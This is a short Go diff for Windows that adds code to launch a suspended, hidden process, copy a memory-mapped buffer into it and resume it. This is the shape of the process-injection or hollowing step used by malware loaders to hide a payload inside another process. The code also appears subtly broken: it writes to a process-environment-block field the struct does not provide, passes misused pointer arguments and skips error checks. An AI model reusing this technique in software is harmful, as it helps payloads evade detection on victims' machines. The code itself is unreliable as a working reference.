@@ -66,9 +66,31 @@ func main() {
 	data := (*[1 << 30]byte)(unsafe.Pointer(addr))[:size]
 	fmt.Println(string(data))
 
-}
+	// Create a new process with the mapped memory as the image
+	var si windows.StartupInfo
+	var pi windows.ProcessInformation
+	z := uint16(0)
+	si.Cb = uint32(unsafe.Sizeof(si))
+	if err = windows.CreateProcess(nil, windows.StringToUTF16Ptr("process"), &sa, &sa, false, windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW, &z, &z, &si, &pi); err != nil {
+		fmt.Println("Error creating process:", err)
+		return
+	}
 
-// func StringToUTF16Ptr(str string) *uint16 {
-// 	wchars := utf16.Encode([]rune(str + "\x00"))
-// 	return &wchars[0]
-// }
+	defer windows.CloseHandle(pi.Process)
+	defer windows.CloseHandle(pi.Thread)
+
+	// Copy the mapped memory into the new process's memory space
+	var written uintptr
+	windows.WriteProcessMemory(pi.Process, pi.PebBaseAddress, addr, size, &written)
+
+	// Resume the new process's execution
+	windows.ResumeThread(pi.Thread)
+
+	// Wait for the new process to exit
+	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
+
+	// Get the exit code
+	var exitCode uint32
+	windows.GetExitCodeProcess(pi.Process, &exitCode)
+	fmt.Println("Process exited with code:", exitCode)
+}
